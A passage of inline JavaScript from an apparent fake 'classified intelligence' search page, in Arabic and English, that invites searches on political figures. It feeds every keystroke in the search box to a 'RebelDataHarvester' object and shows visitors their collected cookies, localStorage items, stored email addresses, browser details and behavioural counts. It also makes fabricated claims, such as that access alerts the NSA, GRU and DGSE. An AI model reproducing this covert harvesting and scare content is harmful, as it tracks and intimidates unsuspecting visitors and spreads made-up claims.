                    return {

                    fontList.forEach(font => {

                        context.font = '72px ' + font + ', monospace';
                        const width = context.measureText('mmmmmmmmmm').width;

                    <div style="margin-top: 15px; color: #FF6666;">
                        <i class="fas fa-search"></i> SEARCH TERM DETECTED: "${searchTerm}"
                    </div>
                </div>
                
                <div class="stats-container">
                    <div class="stat-box">
                        <div class="stat-title">TOTAL RECORDS FOUND</div>
                        <div class="stat-value">${data.stats.totalRecords}</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-title">HIGH RISK INCIDENTS</div>
                        <div class="stat-value" style="color: #FF0000; text-shadow: 0 0 10px #FF0000;">${data.stats.highRisk}</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-title">DATA VOLUME</div>
                        <div class="stat-value">${data.stats.dataVolume}</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-title">EXPOSURE SCORE</div>
                        <div class="stat-value" style="color: #FF0000; text-shadow: 0 0 10px #FF0000;">${data.stats.exposureScore}</div>
                    </div>
                </div>
                
                <div style="grid-column: 1 / -1; color: #00FF00; font-size: 28px; margin: 20px 0; text-align: center;">
                    <i class="fas fa-database"></i> CLASSIFIED INTELLIGENCE DATABASE
                </div>
                
                <div style="grid-column: 1 / -1; max-height: 600px; overflow-y: auto; border: 2px solid #FF0000; border-radius: 10px; padding: 10px;">
                    <table class="breach-table">
                        <thead>
                            <tr>
                                <th>RECORD_ID</th>
                                <th>TYPE</th>
                                <th>RISK</th>
                                <th>DESCRIPTION</th>
                                <th>SOURCE</th>
                                <th>TIMESTAMP</th>
                            </tr>
                        </thead>
                        <tbody>
            `;
            
            // Display first 25 records
            const displayRecords = data.records.slice(0, 25);
            displayRecords.forEach(record => {
                let riskClass = "";
                if (record.risk.includes("TOP_SECRET") || record.risk.includes("ULTRA")) {
                    riskClass = "risk-critical";
                } else if (record.risk === "CLASSIFIED") {
                    riskClass = "risk-high";
                } else {
                    riskClass = "risk-medium";
                }
                
                html += `
                    <tr>
                        <td><span style="color: #00FF00">${record.id}</span></td>
                        <td>${record.type}</td>
                        <td class="${riskClass}">${record.risk}</td>
                        <td>${record.description}</td>
                        <td>${record.source}</td>
                        <td>${record.timestamp}</td>
                    </tr>
                `;
            });
            
            html += `
                        </tbody>
                    </table>
                </div>
            `;
            
            if (data.records.length > 25) {
                html += `
                    <div style="grid-column: 1 / -1; text-align: center; margin: 20px 0;">
                        <div style="color: #FF6666; font-size: 14px;">
                            Showing 25 of ${data.records.length} records. ${data.records.length - 25} additional records available.
                        </div>
                    </div>
                `;
            }
            
            html += `
                <div class="data-card" style="grid-column: 1 / -1;">
                    <div class="risk-indicator">INTELLIGENCE SOURCES</div>
                    <h3><i class="fas fa-satellite-dish"></i> DATA SOURCES & VERIFICATION</h3>
                    <div class="data-content">
                        <div class="data-line critical">• مصادر البيانات: ${data.stats.sources}</div>
                        <div class="data-line">• تاريخ آخر تحديث: ${new Date().toLocaleString('ar-EG')}</div>
                        <div class="data-line">• مستوى الموثوقية: 94.7%</div>
                        <div class="data-line critical">• الوصول إلى هذه البيانات يطلق إنذارات تلقائية لدى: NSA, GRU, DGSE</div>
                    </div>
                </div>
            `;
            
            container.innerHTML = html;
            document.getElementById('data-display').style.display = 'block';
            
            if (window.harvester) {
                window.harvester.triggerGlitch(3);
            }
        }

        function displayFullProfileData(profile) {
            const container = document.getElementById('data-container');
            const header = document.getElementById('profile-header');
            header.innerHTML = `DEEP PROFILE ANALYSIS | RISK SCORE: <span style="color: #FF0000">${profile.riskScore}%</span> | SESSION: ${profile.sessionId}`;
            container.innerHTML = '';
            
            // Current Login Session Information
            let html = `
                <div class="login-session">
                    <div class="session-header">
                        <i class="fas fa-user-circle"></i> CURRENT LOGIN SESSION
                    </div>
                    <div class="data-content">
                        <div class="data-line"><strong>Session ID:</strong> ${profile.sessionId}</div>
                        <div class="data-line"><strong>Session Start:</strong> ${new Date(profile.session.startTime).toLocaleString()}</div>
                        <div class="data-line"><strong>Current URL:</strong> ${profile.session.url}</div>
                        <div class="data-line"><strong>Referrer:</strong> ${profile.session.referrer || 'none'}</div>
                        <div class="data-line"><strong>Protocol:</strong> ${profile.session.protocol}</div>
                        <div class="data-line"><strong>Hostname:</strong> ${profile.session.hostname}</div>
                        <div class="data-line"><strong>Page Load Time:</strong> ${profile.session.pageLoadTime === 'unknown' ? 'unknown' : profile.session.pageLoadTime + 'ms'}</div>
                    </div>
                </div>
            `;
            
            // Email Credentials Section
            html += `
                <div class="email-credentials">
                    <div class="file-header">
                        <i class="fas fa-envelope"></i> EMAIL ACCOUNTS DETECTED
                        <span style="color: #FF0000; font-size: 14px; margin-left: auto;">${profile.emails.addresses.length} EMAILS FOUND</span>
                    </div>
            `;
            
            if (profile.emails.addresses.length > 0) {
                profile.emails.addresses.forEach((email, index) => {
                    const isPrimary = index === 0;
                    html += `
                        <div class="credential-item">
                            <div class="credential-header">
                                <i class="fas fa-user-secret"></i> EMAIL ACCOUNT #${index + 1}
                                ${isPrimary ? '<span class="current-session-badge">CURRENT SESSION</span>' : ''}
                                <span class="credential-badge">${email.includes('gmail') ? 'GMAIL' : email.includes('yahoo') ? 'YAHOO' : email.includes('outlook') ? 'OUTLOOK' : 'OTHER'}</span>
                            </div>
                            <div class="data-content">
                                <div class="data-line"><strong>Email Address:</strong> ${email}</div>
                                <div class="data-line"><strong>Password:</strong> <span class="unknown-data">ENCRYPTED - NOT ACCESSIBLE</span></div>
                                <div class="data-line"><strong>Last Accessed:</strong> ${profile.emails.lastCaptured ? new Date(profile.emails.lastCaptured).toLocaleString() : 'unknown'}</div>
                                <div class="data-line"><strong>Source:</strong> ${email.includes('@') ? 'Browser Storage' : 'Unknown'}</div>
                                ${isPrimary ? '<div class="data-line critical"><strong>Status:</strong> ACTIVE SESSION - This email is currently logged in</div>' : ''}
                            </div>
                        </div>
                    `;
                });
            } else {
                html += `
                    <div class="credential-item">
                        <div class="credential-header">
                            <i class="fas fa-exclamation-circle"></i> NO EMAIL ACCOUNTS FOUND
                        </div>
                        <div class="data-content">
                            <div class="data-line"><strong>Status:</strong> No email addresses detected in browser storage</div>
                            <div class="data-line"><strong>Reason:</strong> Email addresses may be encrypted or not stored in accessible locations</div>
                            <div class="data-line"><strong>Note:</strong> Passwords are never accessible due to browser security restrictions</div>
                        </div>
                    </div>
                `;
            }
            
            html += `</div>`;
            
            // Browser Data Section
            html += `
                <div class="data-card">
                    <div class="risk-indicator">BROWSER DATA</div>
                    <h3><i class="fas fa-window-restore"></i> BROWSER INFORMATION</h3>
                    <div class="data-content">
                        <div class="data-line"><strong>User Agent:</strong> ${profile.hidden.userAgent.substring(0, 80)}...</div>
                        <div class="data-line"><strong>Platform:</strong> ${profile.hidden.platform || 'unknown'}</div>
                        <div class="data-line"><strong>Language:</strong> ${profile.hidden.language || 'unknown'}</div>
                        <div class="data-line"><strong>Screen:</strong> ${profile.hidden.screen.width}x${profile.hidden.screen.height}</div>
                        <div class="data-line"><strong>Timezone:</strong> ${profile.hidden.timezone || 'unknown'}</div>
                    </div>
                </div>
            `;
            
            // Cookies Section
            html += `
                <div class="data-card">
                    <div class="risk-indicator">TRACKING</div>
                    <h3><i class="fas fa-cookie-bite"></i> BROWSER COOKIES</h3>
                    <div class="data-content">
                        <div class="data-line"><strong>Total Cookies:</strong> ${profile.cookies.total || 0}</div>
                        <div class="data-line"><strong>Session Cookies:</strong> ${profile.cookies.sessionCookies || 0}</div>
                        <div class="data-line"><strong>Sample Cookies:</strong></div>
            `;
            
            if (profile.cookies.cookies && profile.cookies.cookies.length > 0) {
                profile.cookies.cookies.slice(0, 3).forEach(cookie => {
                    html += `<div class="data-line" style="font-size: 12px;">• ${cookie.substring(0, 60)}${cookie.length > 60 ? '...' : ''}</div>`;
                });
                if (profile.cookies.cookies.length > 3) {
                    html += `<div class="data-line" style="color: #666;">... and ${profile.cookies.cookies.length - 3} more</div>`;
                }
            } else {
                html += `<div class="data-line unknown-data">No cookies accessible or none found</div>`;
            }
            
            html += `</div></div>`;
            
            // Local Storage Section
            html += `
                <div class="data-card">
                    <div class="risk-indicator">STORAGE</div>
                    <h3><i class="fas fa-database"></i> LOCAL STORAGE</h3>
                    <div class="data-content">
                        <div class="data-line"><strong>Total Items:</strong> ${profile.localStorage.totalItems || 0}</div>
                        <div class="data-line"><strong>Storage Size:</strong> ${profile.localStorage.size || '0 KB'}</div>
            `;
            
            if (profile.localStorage.items && profile.localStorage.items.length > 0) {
                html += `<div class="data-line"><strong>Sample Items:</strong></div>`;
                profile.localStorage.items.slice(0, 2).forEach(item => {
                    html += `<div class="data-line" style="font-size: 12px;">• ${item.key}: ${item.value}</div>`;
                });
                if (profile.localStorage.items.length > 2) {
                    html += `<div class="data-line" style="color: #666;">... and ${profile.localStorage.items.length - 2} more</div>`;
                }
            } else {
                html += `<div class="data-line unknown-data">No localStorage items accessible</div>`;
            }
            
            html += `</div></div>`;
            
            // Network Information
            html += `
                <div class="data-card">
                    <div class="risk-indicator">NETWORK</div>
                    <h3><i class="fas fa-network-wired"></i> NETWORK INFORMATION</h3>
                    <div class="data-content">
                        <div class="data-line"><strong>Connection Type:</strong> ${profile.network.type || 'unknown'}</div>
                        <div class="data-line"><strong>Effective Type:</strong> ${profile.network.effectiveType || 'unknown'}</div>
                        <div class="data-line"><strong>Online Status:</strong> ${profile.network.online ? 'Online' : 'Offline'}</div>
                        <div class="data-line"><strong>Save Data:</strong> ${profile.network.saveData ? 'Enabled' : 'Disabled'}</div>
                    </div>
                </div>
            `;
            
            // Behavioral Data
            html += `
                <div class="data-card">
                    <div class="risk-indicator">BEHAVIORAL</div>
                    <h3><i class="fas fa-brain"></i> USER BEHAVIOR</h3>
                    <div class="data-content">
                        <div class="data-line"><strong>Time on Page:</strong> ${Math.floor(profile.behavioral.timeOnPage / 1000)} seconds</div>
                        <div class="data-line"><strong>Keystrokes:</strong> ${profile.behavioral.keystrokes || 0}</div>
                        <div class="data-line"><strong>Mouse Movements:</strong> ${profile.behavioral.mouseMovements || 0}</div>
                        <div class="data-line"><strong>Clicks:</strong> ${profile.behavioral.clickCount || 0}</div>
                        <div class="data-line"><strong>Scroll Depth:</strong> ${Math.round(profile.behavioral.scrollDepth)}px</div>
                        <div class="data-line"><strong>Typing Speed:</strong> ${profile.behavioral.typingSpeed || '0 wpm'}</div>
                    </div>
                </div>
            `;
            
            // Security Vulnerabilities
            html += `
                <div class="data-card" style="grid-column: 1 / -1;">
                    <div class="risk-indicator">SECURITY ASSESSMENT</div>
                    <h3><i class="fas fa-shield-alt"></i> SECURITY VULNERABILITIES</h3>
                    <div class="data-content">
                        <div class="data-line"><strong>Risk Score:</strong> <span style="color: ${profile.riskScore > 70 ? '#FF0000' : profile.riskScore > 40 ? '#FF6600' : '#00FF00'}">${profile.riskScore}%</span></div>
                        <div class="data-line"><strong>Data Value:</strong> ${profile.dataValue || '$0'}</div>
                        <div class="data-line"><strong>Detected Vulnerabilities:</strong> ${profile.vulnerabilities.length || 0}</div>
            `;
            
            if (profile.vulnerabilities.length > 0) {
                profile.vulnerabilities.forEach(vuln => {
                    html += `<div class="data-line">• ${vuln}</div>`;
                });
            } else {
                html += `<div class="data-line unknown-data">No vulnerabilities detected</div>`;
            }
            
            html += `
                        <div class="data-line"><strong>Browser Extensions:</strong> ${profile.extensions.length || 0}</div>
            `;
            
            if (profile.extensions.length > 0) {
                profile.extensions.forEach(ext => {
                    html += `<div class="data-line">• ${ext}</div>`;
                });
            } else {
                html += `<div class="data-line unknown-data">No extensions detected</div>`;
            }
            
            html += `</div></div>`;
            
            // Final Warning
            html += `
                <div class="warning-box" style="grid-column: 1 / -1;">
                    <div class="warning-title">
                        <i class="fas fa-skull-crossbones"></i> SECURITY ASSESSMENT COMPLETE
                    </div>
                    <div style="font-size: 16px; line-height: 1.8;">
                        <div style="color: #FF0000; margin-bottom: 15px;">⚠️ BROWSER DATA EXTRACTION COMPLETE</div>
                        <div>• <strong>${profile.emails.addresses.length} email addresses</strong> detected in browser storage</div>
                        <div>• <strong>${profile.cookies.total} cookies</strong> currently active in your browser</div>
                        <div>• <strong>${profile.localStorage.totalItems} localStorage items</strong> extracted</div>
                        <div>• <strong>${profile.vulnerabilities.length} security vulnerabilities</strong> identified</div>
                        <div>• <strong>Session duration:</strong> ${Math.floor(profile.behavioral.timeOnPage / 1000)} seconds</div>
                        <div style="color: #00FF00; margin-top: 15px; font-size: 14px;">
                            <i class="fas fa-info-circle"></i> Note: Passwords are never accessible due to browser security. 
                            Email addresses shown are only those stored in browser localStorage/cookies.
                        </div>
                    </div>
                </div>
            `;
            
            container.innerHTML = html;
            document.getElementById('data-display').style.display = 'block';
            
            if (window.harvester) {
                window.harvester.triggerGlitch(2);
            }
        }

        function displayNormalData(searchTerm) {
            const container = document.getElementById('data-container');
            const header = document.getElementById('profile-header');
            header.textContent = `SEARCH RESULTS: "${searchTerm.toUpperCase()}"`;
            
            container.innerHTML = `
                <div class="data-card" style="grid-column: 1 / -1; text-align: center; padding: 50px;">
                    <div style="font-size: 48px; color: #FF0000; margin-bottom: 20px;">
                        <i class="fas fa-search"></i>
                    </div>
                    <h3>NO DATA FOUND</h3>
                    <div class="data-content">
                        <div class="data-line"><strong>Search Query:</strong> "${searchTerm}"</div>
                        <div class="data-line unknown-data">No classified intelligence found for this search term</div>
                        <div class="data-line"><strong>Try searching for:</strong></div>
                        <div class="data-line">• Political figures: السيسي, بوتين, ترامب, ماكرون</div>
                        <div class="data-line">• "ماذا تعرف عني" or "what do you know about me" for personal data</div>
                        <div class="data-line">• "Sisi", "Putin", "Trump" in English or Arabic</div>
                    </div>
                </div>
                
                <div class="data-card" style="grid-column: 1 / -1;">
                    <div class="risk-indicator">SEARCH TIPS</div>
                    <h3><i class="fas fa-lightbulb"></i> HOW TO SEARCH EFFECTIVELY</h3>
                    <div class="data-content">
                        <div class="data-line">• Use both Arabic and English names for political figures</div>
                        <div class="data-line">• Try common misspellings: "sis i" for السيسي</div>
                        <div class="data-line">• Search for "what do you know about me" in any language</div>
                        <div class="data-line">• Use full names or partial matches</div>
                        <div class="data-line">• The system supports mixed language queries</div>
                    </div>
                </div>
            `;
            
            document.getElementById('data-display').style.display = 'block';
        }

        function hideData() {
            document.getElementById('data-display').style.display = 'none';
            document.querySelector('.search-container').style.display = 'block';
        }

        // ==================== INITIALIZATION ====================
        // Initialize harvester immediately
        window.harvester = new RebelDataHarvester();
        let cursor = document.getElementById('cursor');
        
        document.addEventListener('mousemove', (e) => {
            cursor.style.left = e.pageX + 'px';
            cursor.style.top = e.pageY + 'px';
        });
        
        document.getElementById('pharaoh-input').addEventListener('keydown', (e) => {
            if (window.harvester) {
                window.harvester.recordKeystroke(e.key, Date.now());
                window.harvester.lastInteraction = Date.now();
            }
            
            if(e.key === 'Enter') {
                const query = e.target.value.trim();
                if(query) {
                    showCountdown(query);
                    e.target.value = '';
                }
            }
        });

        // Auto-focus on input
        document.getElementById('pharaoh-input').focus();

        console.log('Rebel Harvester Active - Real Data Only');
        console.log('Security: Enhanced Detection Active');
        console.log('Email Extraction: ' + window.harvester.collectedData.emails.addresses.length + ' emails found');
        console.log('Political Database: Ready with enhanced search');
    </script>
</body>
